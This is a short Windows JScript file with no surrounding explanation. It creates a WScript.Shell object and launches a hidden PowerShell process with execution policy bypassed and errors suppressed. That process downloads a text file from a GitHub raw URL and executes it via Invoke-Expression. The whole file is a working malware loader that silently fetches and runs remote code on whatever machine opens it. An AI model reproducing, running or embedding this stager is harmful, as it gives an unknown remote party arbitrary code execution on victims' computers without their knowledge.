var yes, omhyt, sex;

yes = "https://raw.githubusercontent.com/bhh545578-lab/gg1z1/main/uploaded/NENENELE5553553x.txt";

sex = new ActiveXObject("WScript.Shell");

omhyt = "powershell.exe -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command " +
        "\"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" +
        "$ProgressPreference='SilentlyContinue';" +
        "$ErrorActionPreference='SilentlyContinue';" +
        "iex((New-Object Net.WebClient).DownloadString('" + yes + "'))\"";

sex.Run(omhyt, 0, false);

sex = null;
